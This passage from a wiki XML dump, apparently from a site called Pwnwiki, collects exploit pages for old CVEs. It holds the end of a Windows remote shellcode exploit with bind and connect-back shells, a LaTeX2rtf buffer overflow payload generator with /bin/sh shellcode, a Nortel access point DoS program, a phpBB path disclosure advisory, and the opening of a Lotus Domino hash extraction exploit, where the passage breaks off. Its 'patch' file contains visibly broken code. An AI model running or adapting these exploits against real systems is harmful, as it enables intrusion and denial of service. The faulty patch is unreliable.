			if(szRecvBuff[0] == '5')
			{
				printf("[-] Server return a error Message.\r\n");
				__leave;
			}

			iErr = send(s, szSend[i], strlen(szSend[i]),0);
			if(iErr == SOCKET_ERROR)
			{
				printf("[-] Send buffer error:%d.\n", WSAGetLastError());
				__leave;
			}

			if(i==sizeof(szSend)/sizeof(szSend[0])-1)
				printf("[+] Send shellcode %d bytes.\n", iErr);
			else
				printf("[+] Send: %s", szSend[i]);
		}

		printf("[+] If you don't have a shell it didn't work.\n");

		if(bCb)
		{
			if(bLocal)
			{
				printf("[+] Wait for shell...\n");
			
				len = sizeof(client);
				s3 = accept(s2, (struct sockaddr*)&amp;client, &amp;len); 
				if(s3 != INVALID_SOCKET) 
				{ 
	printf("[+] Exploit success! Good luck! :)\n");
	printf("[+] ===--===--===--===--===--===--===--===--===--===--===--===--===--===\n");
					shell(s3);
				}
			}	
		}
		else
		{
			printf("[+] Connect to shell...\n");
			
			Sleep(1000);
			s2 = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
			server.sin_family = AF_INET;
			server.sin_port = htons(shport);
			server.sin_addr.s_addr=inet_addr(ip);

			ret = connect(s2, (struct sockaddr *)&amp;server, sizeof(server));
			if(ret!=0)
			{
				printf("[-] Exploit seem failed.\n");
				__leave;
			}
			
	printf("[+] Exploit success! Good luck! :)\n");
	printf("[+] ===--===--===--===--===--===--===--===--===--===--===--===--===--===\n");
			shell(s2);
		}
		
		
	}

 	__finally
	{
		if(s != INVALID_SOCKET) closesocket(s);
		if(s2 != INVALID_SOCKET) closesocket(s2);
		if(s3 != INVALID_SOCKET) closesocket(s3);
		WSACleanup();
	}

	return;
}

// milw0rm.com [2004-01-27]
            
&lt;/pre&gt;</text>
      <sha1>m6dyo7rkf0anz9ky3rvwtmyq098dgry</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2004-2167 LaTeX2rtf 1.9.15緩衝區溢出漏洞</title>
    <ns>0</ns>
    <id>605</id>
    <revision>
      <id>820</id>
      <timestamp>2021-04-01T02:21:59Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==INFO== &lt;pre&gt; # cve-2004-2167   Code to be tested:  Download CentOS 6.4 Opertaing System  Download the Latex2RTf to the Downloads folder from the below link:          https:/..."</comment>
      <origin>820</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="19378" sha1="0rm8dluiqe8siel1pah7ij3bmcchfrx" xml:space="preserve">==INFO==
&lt;pre&gt;
# cve-2004-2167


Code to be tested:

Download CentOS 6.4 Opertaing System

Download the Latex2RTf to the Downloads folder from the below link:
    
    https://sourceforge.net/projects/latex2rtf/files/latex2rtf-win/1.9.15/

cd /home/username/Downloads/

tar -xvf latex2rtf-1.9.15.tar.gz

 cd latex2rtf-1.9.15
 
sudo make 

sudo make install

gcc -o exploit exploit.c 

./exploit &gt; shell_code.tex

./latex2rtf shell_code.tex

Steps for patching:
Download the patch from:

https://github.com/uzzzval/cve-2004-2167/blob/master/definitions_patch.c

cp definitions_patch.c /home/username/Downloads/latex2rtf-1.9.15/
mv definitions_patch.c definitions.c
sudo Make
sudo make install
./latex2rtf shell_code.tex

&lt;/pre&gt;

==definitions_patch.c==
&lt;pre&gt;
/* definitions.c - Routines to handle TeX \def and LaTeX \newcommand 

Copyright (C) 2001-2002 The Free Software Foundation

This program is free software; you can redistribute it and/or
modify it under the terms of the GNU General Public License
as published by the Free Software Foundation; either version 2
of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program; if not, write to the Free Software
Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.

This file is available from http://sourceforge.net/projects/latex2rtf/
*/

#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include "main.h"
#include "convert.h"
#include "definitions.h"
#include "parser.h"
#include "funct1.h"
#include "util.h"
#include "cfg.h"
#include "counters.h"
#include "funct1.h"

#define MAX_DEFINITIONS 200
#define MAX_ENVIRONMENTS 20
#define MAX_THEOREMS 20

struct {
	char * name;
	char * opt_param;
	char * def;
	int  params;
} Definitions[MAX_DEFINITIONS];

struct {
	char * name;
	char * opt_param;
	char * begname;
	char * endname;
	char * begdef;
	char * enddef;
	int  params;
} NewEnvironments[MAX_ENVIRONMENTS];

struct {
	char * name;
	char * numbered_like;
	char * caption;
	char * within;
} NewTheorems[MAX_THEOREMS];

static int iDefinitionCount = 0;
static int iNewEnvironmentCount = 0;
static int iNewTheoremCount = 0;

static int 
strequal(char *a, char *b)
{
	if (a==NULL || b==NULL)
		return 0;
		
	while (*a &amp;&amp; *b &amp;&amp; *a==*b) {a++;b++;}
	
	if (*a || *b)
		return 0;
	else
		return 1;
}

/* static void printDefinitions(void)
{
int i=0;
	fprintf(stderr, "\n");
	while(i &lt; iDefinitionCount ) {
		fprintf(stderr, "[%d] name     =&lt;%s&gt;\n",i, Definitions[i].name);
		fprintf(stderr, "    opt_param=&lt;%s&gt;\n", Definitions[i].opt_param);
		fprintf(stderr, "    def      =&lt;%s&gt;\n", Definitions[i].def);
		fprintf(stderr, "    params   =&lt;%d&gt;\n", Definitions[i].params);
		i++;
	}
}

static void printTheorems(void)
{
int i=0;
	fprintf(stderr, "\n");
	for (i=0; i&lt; iNewTheoremCount; i++) {
		fprintf(stderr, "[%d] name   =&lt;%s&gt;\n",i, NewTheorems[i].name);
		fprintf(stderr, "    caption    =&lt;%s&gt;\n", NewTheorems[i].caption);
		fprintf(stderr, "    like =&lt;%s&gt;\n", NewTheorems[i].numbered_like);
		fprintf(stderr, "    within    =&lt;%s&gt;\n", NewTheorems[i].within);
	}
}
*/

bool 
isValid(char *macro)
{
	if(strlen(macro_piece) &lt;= 1024)
		return TRUE;
	return FALSE
}

static char *
expandmacro(char *macro, char *opt_param, int params)
/**************************************************************************
     purpose: retrieves and expands a defined macro 
**************************************************************************/
{
	int i=0,param;
	char * args[9], *dmacro, *macro_piece, *next_piece, *expanded, buffer[1024], *cs;

	if (params&lt;=0) 
		return strdup(macro);
	
	if (opt_param) {
		args[i++] = getBracketParam();
		if (!args[0]) args[0] = strdup(opt_param);
	}

	for (; i&lt;params; i++) {
		args[i] = getBraceParam();
		diagnostics(3, "argument #%d &lt;%s&gt;", i+1, args[i]);
	}
	
	*buffer='\0';
	expanded = buffer;
	dmacro = strdup(macro);
	macro_piece = dmacro;
	
	/* convert "\csname" to "\" */
	while ((cs=strstr(dmacro, "\\csname")) != NULL) strcpy(cs+1,cs+7);
		
	/* remove "\endcsname" */
	while ((cs=strstr(dmacro, "\\endcsname")) != NULL) strcpy(cs,cs+10);
	
	/* do not use strtok because it may be used elsewhere */
	while (macro_piece &amp;&amp; *macro_piece) {

		next_piece = strchr(macro_piece, '#');
		if (next_piece) {
			*next_piece = '\0';
			next_piece++;
			if (*next_piece=='#')
				param = 101;				/* just a flag for below */
			else
				param = *next_piece - '1';
			next_piece++;
		} else
			param = -1;
			
		diagnostics(3, "expandmacro piece =&lt;%s&gt;", macro_piece);
		if (isValid(macro_piece))
			strcpy(expanded,macro_piece);
		else
			diagnostics(WARNING,"Definitions length is larger than expected");
		expanded += strlen(macro_piece);
		if (param &gt; -1) {
			if (param==101) {
				diagnostics(3, "expandmacro ## = #");
				strcpy(expanded,"#");
				expanded ++;
			} else if (param&lt;params) {
				diagnostics(3, "expandmacro arg =&lt;%s&gt;", args[param]);
				strcpy(expanded,args[param]);
				expanded += strlen(args[param]);
			} else
				diagnostics(WARNING,"confusing definition in macro=&lt;%s&gt;", macro);
		}
		
		macro_piece = next_piece;
	}
	
	
/*	ConvertString(buffer);*/
	for (i=0; i&lt; params; i++)
		if (args[i]) free(args[i]);

	if (dmacro) free(dmacro);

	diagnostics(3, "expandmacro expanded=&lt;%s&gt;", buffer);
	return strdup(buffer);
}

int
maybeDefinition(char * s, size_t n)
/**************************************************************************
     purpose: checks to see if a named TeX definition possibly exists
     returns: the array index of the named TeX definition
**************************************************************************/
{
	int i;
	
	if (n==0) return TRUE;
	
	for (i=0; i&lt;iDefinitionCount; i++) {
		diagnostics(6, "seeking=&lt;%s&gt;, i=%d, current=&lt;%s&gt;", s,i,Definitions[i].name);
		if (strncmp(s,Definitions[i].name,n) == 0) 
			return TRUE;
	}

	return FALSE;
}

int
existsDefinition(char * s)
/**************************************************************************
     purpose: checks to see if a named TeX definition exists
     returns: the array index of the named TeX definition
**************************************************************************/
{
	int i;
	
	for (i=0; i&lt;iDefinitionCount; i++) {
		diagnostics(6, "seeking=&lt;%s&gt;, i=%d, current=&lt;%s&gt;", s,i,Definitions[i].name);
		if (strcmp(s,Definitions[i].name) == 0) break;
	}

	if (i==iDefinitionCount) 
		return -1;
	else
		return i;
}

void
newDefinition(char *name, char * opt_param, char *def, int params)
/**************************************************************************
     purpose: allocates and initializes a named TeX definition 
              name should not begin with a '\'  for example to
              define \hd, name = "hd"
**************************************************************************/
{
	diagnostics(3,"Adding macro &lt;%s&gt;=&lt;%s&gt;",name,def);

	if (strcmp(name,"LaTeX")==0) return;
	if (strcmp(name,"TeX")==0) return;
	if (strcmp(name,"AmSTeX")==0) return;
	if (strcmp(name,"BibTex")==0) return;
	if (strcmp(name,"LaTeXe")==0) return;
	if (strcmp(name,"AmSLaTeX")==0) return;
	
	if (iDefinitionCount==MAX_DEFINITIONS){
		diagnostics(WARNING,"Too many definitions, ignoring %s", name);
		return;
	}
	
	Definitions[iDefinitionCount].params=params; 
	
	Definitions[iDefinitionCount].name=strdup(name); 
	
	if (Definitions[iDefinitionCount].name==NULL) {
		diagnostics(ERROR, "\nCannot allocate name for definition \\%s\n", name);
	}
	
	if (opt_param) {
		Definitions[iDefinitionCount].opt_param=strdup(opt_param); 

		if (Definitions[iDefinitionCount].opt_param==NULL) {
			diagnostics(ERROR, "\nCannot allocate opt_param for definition \\%s\n", name);
		}
	}
	else {
	  Definitions[iDefinitionCount].opt_param=NULL;
	}

	Definitions[iDefinitionCount].def=strdup(def); 

	if (Definitions[iDefinitionCount].def==NULL) {
		diagnostics(ERROR, "\nCannot allocate def for definition \\%s\n", name);
	}
	
	iDefinitionCount++;
	diagnostics(3,"Successfully added macro #%d",iDefinitionCount);
}

void
renewDefinition(char * name, char * opt_param, char * def, int params)
/**************************************************************************
     purpose: allocates (if necessary) and sets a named TeX definition 
**************************************************************************/
{
	int i;

	diagnostics(3,"renewDefinition seeking &lt;%s&gt;\n",name);
	i = existsDefinition(name);
	
	if (i&lt;0) {
		newDefinition(name, opt_param, def, params);
		diagnostics(WARNING, "No existing definition for \\%s", name);
		
	} else {
		free(Definitions[i].def);
		if (Definitions[i].opt_param) free(Definitions[i].opt_param); 
		Definitions[i].params = params;
		if (opt_param) {
			Definitions[i].opt_param=strdup(opt_param); 
			if (Definitions[i].opt_param==NULL) {
				diagnostics(ERROR, "\nCannot allocate opt_param for definition \\%s\n", name);
			}
		}
		else {
			Definitions[i].opt_param=NULL;
		}

		Definitions[i].def = strdup(def);
		if (Definitions[i].def==NULL) {
			diagnostics(WARNING, "\nCannot allocate def for definition \\%s\n", name);
			exit(1);
		}
	}
}

char *
expandDefinition(int thedef)
/**************************************************************************
     purpose: retrieves and expands a \newcommand macro 
**************************************************************************/
{

	if (thedef&lt;0 || thedef&gt;=iDefinitionCount)
		return NULL;
	
	diagnostics(3, "expandDefinition name     =&lt;%s&gt;", Definitions[thedef].name);
	diagnostics(3, "expandDefinition opt_param=&lt;%s&gt;", 
	        (Definitions[thedef].opt_param) ? Definitions[thedef].opt_param : "");
	diagnostics(3, "expandDefinition def      =&lt;%s&gt;", Definitions[thedef].def);
	diagnostics(3, "expandDefinition params   =&lt;%d&gt;", Definitions[thedef].params);

	return expandmacro(Definitions[thedef].def, Definitions[thedef].opt_param, Definitions[thedef].params);
}

int
existsEnvironment(char * s)
/**************************************************************************
     purpose: checks to see if a user created environment exists
     returns: the array index of the \newenvironment
**************************************************************************/
{
	int i=0;
	size_t n;
	
	n = strlen(s);
	while(i &lt; iNewEnvironmentCount &amp;&amp; !strequal(s,NewEnvironments[i].name)) {
		diagnostics(4, "e seeking=&lt;%s&gt;, i=%d, current=&lt;%s&gt;", s,i,NewEnvironments[i].name);
		i++;
	}

	if (i==iNewEnvironmentCount) 
		return -1;
	else
		return i;
}

int
maybeEnvironment(char * s, size_t n)
/**************************************************************************
     purpose: checks to see if a named TeX environment possibly exists
     returns: the array index of the named TeX definition
**************************************************************************/
{
	int i;
	
	if (n==0) return TRUE;
	
	for (i=0; i&lt;iNewEnvironmentCount; i++) {
		diagnostics(6, "seeking=&lt;%s&gt;, i=%d, current=&lt;%s&gt;", s,i,NewEnvironments[i].name);
		if (strncmp(s,NewEnvironments[i].begname,n) == 0 || 
		    strncmp(s,NewEnvironments[i].endname,n) == 0) {
		    	diagnostics(6,"possible");
		   		return TRUE;
		}
	}

	diagnostics(6,"not possible");
	return FALSE;
}

void
newEnvironment(char *name, char *opt_param, char *begdef, char *enddef, int params)
/**************************************************************************
     purpose: allocates and initializes a \newenvironment 
              name should not begin with a '\' 
**************************************************************************/
{
	if (iNewEnvironmentCount==MAX_ENVIRONMENTS){
		diagnostics(WARNING,"Too many newenvironments, ignoring %s", name);
		return;
	}
	
	NewEnvironments[iNewEnvironmentCount].name=strdup(name); 
	NewEnvironments[iNewEnvironmentCount].begname=strdup_together("\\begin{",name); 
	NewEnvironments[iNewEnvironmentCount].endname=strdup_together("\\end{",name); 
	NewEnvironments[iNewEnvironmentCount].begdef=strdup(begdef); 
	NewEnvironments[iNewEnvironmentCount].enddef=strdup(enddef); 
	NewEnvironments[iNewEnvironmentCount].params=params; 

	if (opt_param) {
		NewEnvironments[iNewEnvironmentCount].opt_param=strdup(opt_param); 

		if (NewEnvironments[iNewEnvironmentCount].opt_param==NULL) {
			diagnostics(ERROR, "\nCannot allocate opt_param for \\newenvironment{%s}", name);
		}
	}
	else {
	  NewEnvironments[iNewEnvironmentCount].opt_param=NULL;
	}


	if (NewEnvironments[iNewEnvironmentCount].name   ==NULL ||
		NewEnvironments[iNewEnvironmentCount].begdef ==NULL ||
		NewEnvironments[iNewEnvironmentCount].begname==NULL ||
		NewEnvironments[iNewEnvironmentCount].endname==NULL ||
	    NewEnvironments[iNewEnvironmentCount].enddef ==NULL) {
		diagnostics(ERROR, "Cannot allocate memory for \\newenvironment{%s}", name);
	}
	
	iNewEnvironmentCount++;
}

void
renewEnvironment(char *name, char *opt_param, char *begdef, char *enddef, int params)
/**************************************************************************
     purpose: allocates and initializes a \renewenvironment 
**************************************************************************/
{
	int i;
	i = existsEnvironment(name);
	
	if (i&lt;0) {
		newEnvironment(name, opt_param, begdef, enddef, params);
		diagnostics(WARNING, "No existing \\newevironment{%s}", name);
		
	} else {
		free(NewEnvironments[i].begdef);
		free(NewEnvironments[i].enddef);
		free(NewEnvironments[i].begname);
		free(NewEnvironments[i].endname);
		if (NewEnvironments[i].opt_param) free(NewEnvironments[i].opt_param); 
		if (opt_param) {
			NewEnvironments[i].opt_param=strdup(opt_param); 
			if (NewEnvironments[i].opt_param==NULL) {
				diagnostics(ERROR, "\nCannot allocate opt_param for \\renewenvironment{%s}", name);
			}
		}
		else {
			NewEnvironments[i].opt_param=NULL;
		}
		NewEnvironments[i].params = params;
		NewEnvironments[i].begdef = strdup(begdef);
		NewEnvironments[i].enddef = strdup(enddef);
		if (NewEnvironments[i].begdef==NULL || NewEnvironments[i].enddef==NULL) {
			diagnostics(ERROR, "Cannot allocate memory for \\renewenvironment{%s}", name);
		}
	}
}

char *
expandEnvironment(int thedef, int code)
/**************************************************************************
     purpose: retrieves and expands a \newenvironment 
**************************************************************************/
{
	if (thedef&lt;0 || thedef&gt;=iNewEnvironmentCount)
		return NULL;
	
	if (code == CMD_BEGIN) {
	
		diagnostics(3, "\\begin{%s} &lt;%s&gt;", NewEnvironments[thedef].name, \
										   NewEnvironments[thedef].begdef);
		return expandmacro(NewEnvironments[thedef].begdef, 
				   NewEnvironments[thedef].opt_param, 
				   NewEnvironments[thedef].params);
	
	} else {

		diagnostics(3, "\\end{%s} &lt;%s&gt;", NewEnvironments[thedef].name, \
										 NewEnvironments[thedef].enddef);
		return expandmacro(NewEnvironments[thedef].enddef, NULL, 0);
	}
}

void
newTheorem(char *name, char *caption, char *numbered_like, char *within)
/**************************************************************************
     purpose: allocates and initializes a \newtheorem 
**************************************************************************/
{
	if (iNewTheoremCount==MAX_THEOREMS){
		diagnostics(WARNING,"Too many \\newtheorems, ignoring %s", name);
		return;
	}
	
	NewTheorems[iNewTheoremCount].name=strdup(name); 
	
	NewTheorems[iNewTheoremCount].caption=strdup(caption); 

	if (numbered_like)
		NewTheorems[iNewTheoremCount].numbered_like=strdup(numbered_like);
	else 
		NewTheorems[iNewTheoremCount].numbered_like=strdup(name);

	if (within)
		NewTheorems[iNewTheoremCount].within=strdup(within);
	else 
		NewTheorems[iNewTheoremCount].within=NULL;
		
	setCounter(NewTheorems[iNewTheoremCount].numbered_like,0);

	iNewTheoremCount++;
}

int
existsTheorem(char * s)
/**************************************************************************
     purpose: checks to see if a user created environment exists
     returns: the array index of the \newtheorem
**************************************************************************/
{
	int i=0;
	
	while(i &lt; iNewTheoremCount &amp;&amp; !strequal(s,NewTheorems[i].name)) {
		diagnostics(6, "seeking=&lt;%s&gt;, i=%d, current=&lt;%s&gt;", s,i,NewTheorems[i].name);
		i++;
	}

	if (i==iNewTheoremCount) 
		return -1;
	else
		return i;
}

char *
expandTheorem(int i, char *option)
/**************************************************************************
     purpose: retrieves and expands a \newtheorem into a string
**************************************************************************/
{	
	char s[128], *num;
	int ithm;
	
	if (i&lt;0 || i&gt;=iNewTheoremCount)
		return strdup("");
	
	incrementCounter(NewTheorems[i].numbered_like);
	ithm = getCounter(NewTheorems[i].numbered_like);
	
	if (NewTheorems[i].within) {
		num = FormatUnitNumber(NewTheorems[i].within);
		if (option)
			snprintf(s,128,"%s %s.%d (%s)", NewTheorems[i].caption, num, ithm, option);
		else
			snprintf(s,128,"%s %s.%d", NewTheorems[i].caption, num, ithm);
		free(num);
	} else {
		if (option)
			snprintf(s,128,"%s %d (%s)", NewTheorems[i].caption, ithm, option);
		else
			snprintf(s,128,"%s %d", NewTheorems[i].caption, ithm);
	}
			
	return strdup(s);
}

void
resetTheoremCounter(char *unit)
/**************************************************************************
     purpose: resets theorem counters based on unit
**************************************************************************/
{	
	int i;
	
	for (i=0; i&lt;iNewTheoremCount; i++) {
		if (strequal(unit,NewTheorems[i].within))
			setCounter(NewTheorems[i].numbered_like, 0);
	}
}


&lt;/pre&gt;

==exploit.c==
&lt;pre&gt;
/* The below file has been creeated for prepearing the .tex file which will be helpful in launching the exploit. */
//Global Variables
char values[] = {
   //Shell Code responsible for the exploit
   0x31, 0xc0, 0xb0, 0x46, 0x31, 0xdb, 0x31, 0xc9, 0xcd, 0x80, 0xeb, 0x16, 0x5b, 0x31, 0xc0, 0x88, 0x43, 0x07, 0x89, 0x5b, 0x08, 0x89, 0x43, 0x0c, 0xb0, 0x0b, 0x8d, 0x4b, 0x08, 0x8d, 0x53, 0x0c, 0xcd, 0x80, 0xe8, 0xe5, 0xff, 0xff, 0xff, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68
} ;

int main(){
 
  int i;

  printf("\\def\\row#1{");

  //Firstly, adding all As in the definition
  for(i=0;i&lt;1064;i++)
    putchar('A');

  //Based on the memory values obtained after debugging, args corresponds to

  for (i = 0;i &lt; 8;++i) {
    putchar(0x40); 
    putchar(0x73); 
    putchar(0x08); 
    putchar(0x08);
  }
   
  putchar(0x94); 
  putchar(0xf0); 
  putchar(0xff); 
  putchar(0xbf);

  for (i = 0;i &lt; 2;++i) {
    putchar(0xa0); 
    putchar(0x9a); 
    putchar(0x08); 
    putchar(0x08);
  }

  //For hitting the smasher, we will have to add the following values which we got from the dump
  for (i = 0;i &lt; 5;++i) {
    putchar(0x94); 
    putchar(0xf0); 
    putchar(0xff); 
    putchar(0xbf);
  }
  
  //Adding all the NOPs
  for (i = 0;i &lt; 256;++i)
    putchar(0x90);

  putchar(0xeb); 
  putchar(sizeof(values));

  for (i = 0;i &lt; sizeof values;++i)
    putchar(values[i]);

  putchar(0xe8);

  putchar(251 - sizeof values); 

  putchar(0xff); 
  putchar(0xff); 
  putchar(0xff);

  printf("}\n");
  printf("\\begin{document}\n");
  printf("\\row a\n");
  printf("\\end{document}\n");
}

&lt;/pre&gt;</text>
      <sha1>0rm8dluiqe8siel1pah7ij3bmcchfrx</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2004-2271 MiniShare 1.4.1緩衝區溢出漏洞</title>
    <ns>0</ns>
    <id>607</id>
    <revision>
      <id>822</id>
      <timestamp>2021-04-01T02:28:37Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==Screenshot== [[File:Image1.png | 500px]]  ==Exploit== https://github.com/JustYoomoon/Exploit/blob/main/CVE-2004-2271.zip"</comment>
      <origin>822</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="122" sha1="9cecaickip3afucedl405kqupnrodtg" xml:space="preserve">==Screenshot==
[[File:Image1.png | 500px]]

==Exploit==
https://github.com/JustYoomoon/Exploit/blob/main/CVE-2004-2271.zip</text>
      <sha1>9cecaickip3afucedl405kqupnrodtg</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2004-2549 Nortel Wireless LAN拒絕服務漏洞</title>
    <ns>0</ns>
    <id>608</id>
    <revision>
      <id>823</id>
      <timestamp>2021-04-01T02:33:28Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==INFO== &lt;pre&gt; source: http://www.securityfocus.com/bid/9787/info  Nortel Wireless LAN Access Point 2200 series appliances have been reported to be prone to a remote denial of..."</comment>
      <origin>823</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2433" sha1="9uqqvv8ymzb08lakp51nfjv697tzeqi" xml:space="preserve">==INFO==
&lt;pre&gt;
source: http://www.securityfocus.com/bid/9787/info

Nortel Wireless LAN Access Point 2200 series appliances have been reported to be prone to a remote denial of service vulnerability. The issue is reported to present itself when a large network request is handled by one of the Wireless LAN Access Point default administration services. This will reportedly cause the Access Point Appliance Operating service to crash, effectively denying service to legitimate users.

/* WLAN-DoS.c
 *
 * Nortel Networks Wireless LAN Access Point 2200 DoS + PoC
 * discovered by Alex Hernandez.
 *
 * Copyright (C) 2004  Alex Hernandez.
 *
 * A successful attack on a vulnerable server can cause the AP
 * (Access Point) listener to fail and crash. The port 23 (telnet)
 * functionality cannot be restored until the listener is manually restarted.
 *
 * LAN AP 2200 permits client-server communication across any network.
 * LAN enables by default the port 23 (telnet) and port (80) for administering.
 * Debugging features are enabled by default, if LAN AP encounters such a request,
 * it will crash and no longer field AP requests from authorized clients.
 *
 * Simple lame code by
 *
 * -Mark Ludwik :Germany
 *
 *
 */

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;netdb.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;sys/types.h&gt;

int main(int argc, char *argv[]) {
 if(argc &lt; 3) {
  printf("\nWLAN NortelNetworks AP DoS exploit by Mark Ludwik\n\n");
  printf("Usage: WlanDoS [AP/Host] [port]\n\n");
  exit(-1);
 }

 int sock;
 char explbuf[2024];
 struct sockaddr_in dest;
 struct hostent *he;

 if((he = gethostbyname(argv[1])) == NULL) {
  printf("Couldn't resolve %s!\n", argv[1]);
  exit(-1);
 }

 if((sock = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
  perror("socket()");
  exit(-1);
 }

 printf("\nWLAN NortelNetworks AP DoS exploit by Mark Ludwik\n\n");

 dest.sin_addr = *((struct in_addr *)he-&gt;h_addr);
 dest.sin_port = htons(atoi(argv[2]));
 dest.sin_family = AF_INET;

 printf("[+] Exploit buffer.\n");
 memset(explbuf, 'A', 2024);
 memcpy(explbuf+2024, "\n\n\n\n\n\n\n\n", 8);

 if(connect(sock, (struct sockaddr *)&amp;dest, sizeof(struct sockaddr)) == -1) {
  perror("connect()");
  exit(-1);
 }

 printf("[+] Connected...\n");
 printf("[+] Sending DoS attack...!\n");

 send(sock, explbuf, strlen(explbuf), 0);
 sleep(2);
 close(sock);
 printf("\n[+] Crash was successful !\n");
 return(0);
}
&lt;/pre&gt;</text>
      <sha1>9uqqvv8ymzb08lakp51nfjv697tzeqi</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2005-0603 phpBB 2.0.12路徑泄漏漏洞</title>
    <ns>0</ns>
    <id>609</id>
    <revision>
      <id>824</id>
      <timestamp>2021-04-01T02:35:43Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==INFO== &lt;pre&gt; CVE: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-0603 -------------------------------------------------------- [N]eo [S]ecurity [T]eam [NST]® - Adv..."</comment>
      <origin>824</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="3031" sha1="6h1t7dc4cqtjmvwsiw6wkp6krjcqn3i" xml:space="preserve">==INFO==
&lt;pre&gt;
CVE: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-0603
--------------------------------------------------------
[N]eo [S]ecurity [T]eam [NST]® - Advisory #06 - 25/02/05
--------------------------------------------------------
Program:  phpBB 2.0.12
Homepage:  http://www.phpbb.com
Vulnerable Versions: phpBB 2.0.12 &amp; Lower versions
Risk: Low Risk!!
Impact: Full path disclosure

      -==phpBB 2.0.12 Full path disclosure==-
---------------------------------------------------------

- Description
---------------------------------------------------------
phpBB is a high powered, fully scalable, and highly customizable
Open Source bulletin board package. phpBB has a user-friendly
interface, simple and straightforward administration panel, and
helpful FAQ. Based on the powerful PHP server language and your
choice of MySQL, MS-SQL, PostgreSQL or Access/ODBC database servers,
phpBB is the ideal free community solution for all web sites.

- Tested
---------------------------------------------------------
localhost &amp; many forums

- Explotation
---------------------------------------------------------
phpBB/viewtopic.php?p=6&amp;highlight=\[HaCkZaTaN]

It'll come out something like this.

Warning: Compilation failed: missing terminating ] for
character class at offset 20 in /home/nst/forum/viewtopic.php(1110) :
regexp code on line 1

It'll give a full path disclosure and also one thing that i noticed is
that the posts change it doesn't come out nothing.
In the HighLight Variable

Here is the problem:
-----[ Start Vuln Code ] ------------------------------------

1106: if ($highlight_match)
1107: {
1108: // This was shamelessly 'borrowed' from volker at multiartstudio dot de
1109: // via php.net's annotated manual
1110: $message = str_replace('\"', '"', \
substr(preg_replace('#(\&gt;(((?&gt;([^&gt;&lt;]+|(?R)))*)\&lt;))#se', "preg_replace('#\b(" . \
$highlight_match . ")\b#i', '&lt;span style=\"color:#" . $theme['fontcolor3'] . \
                "\"&gt;&lt;b&gt;\\\\1&lt;/b&gt;&lt;/span&gt;', '\\0')", '&gt;' . $message . '&lt;'), 1, -1)); 1111: }

-----[ Ends Vulns Code ] ------------------------------------
Don't borrow stuff lol.

- Exploit
---------------------------------------------------------
Not Yet xD
 
- Solutions
--------------------------------------------------------
Not Yet xD

OK other thing that i noticed was in php.ini

magic_quotes_gpc = On
magic_quotes_sybase = Off

you have to turn both of them ON

- References
--------------------------------------------------------
http://neossecurity.net/Advisories/Advisory-06.txt


- Credits
-------------------------------------------------
Discovered by HaCkZaTaN &lt;hck_zatan@hotmail.com&gt;

[N]eo [S]ecurity [T]eam [NST]® - http://neossecurity.net/

Got Questions? http://neossecurity.net/

Irc.InfoGroup.cl #neosecurityteam

- Greets
--------------------------------------------------------
           Paisterist
           T0wn3r
	   Heap
           Nitrous
           CrashCool
           eL_mEsIaS
           Makoki

           And my Colombian people

&lt;/pre&gt;</text>
      <sha1>6h1t7dc4cqtjmvwsiw6wkp6krjcqn3i</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2005-1525 config settings.php SQL注入漏洞</title>
    <ns>0</ns>
    <id>610</id>
    <revision>
      <id>825</id>
      <timestamp>2021-04-01T02:38:01Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==Exploit== https://github.com/JustYoomoon/Exploit/blob/main/CVE-2005-1125.zip"</comment>
      <origin>825</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="78" sha1="lucuxn18c1lqh8tpmphtp0f5cqubhgw" xml:space="preserve">==Exploit==
https://github.com/JustYoomoon/Exploit/blob/main/CVE-2005-1125.zip</text>
      <sha1>lucuxn18c1lqh8tpmphtp0f5cqubhgw</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2005-2428 Lotus Domino R5 and R6 WebMail漏洞</title>
    <ns>0</ns>
    <id>611</id>
    <revision>
      <id>826</id>
      <timestamp>2021-04-01T02:39:48Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==Exploit== &lt;pre&gt; #!/usr/bin/env python2  # Exploit Title: IBM Lotus Domino &lt;= R8 Password Hash Extraction Exploit # Google Dork: inurl:names.nsf?opendatabase # Date: 02-24-20..."</comment>
      <origin>826</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="6866" sha1="87g4gp8vhg294q7z6gy8cmis111mwwh" xml:space="preserve">==Exploit==
&lt;pre&gt;
#!/usr/bin/env python2

# Exploit Title: IBM Lotus Domino &lt;= R8 Password Hash Extraction Exploit
# Google Dork: inurl:names.nsf?opendatabase
# Date: 02-24-2016
